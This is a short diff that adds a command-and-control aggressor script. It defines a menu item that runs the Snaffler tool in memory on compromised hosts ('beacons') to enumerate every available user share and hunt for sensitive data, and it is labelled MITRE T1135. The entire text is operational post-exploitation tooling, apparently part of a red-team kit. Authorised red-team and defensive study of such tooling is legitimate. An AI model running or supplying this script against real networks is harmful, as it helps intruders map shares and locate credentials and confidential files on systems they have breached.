@@ -1,0 +1,14 @@
+########################
+#Find Shares - User Enumeration All
+########################
+item "Snaffler - Display All Available User Shares (Noisy) - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserallshares($bid);
+      }
+   }
+   
+sub finduserallshares{
+bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -v data");
+}
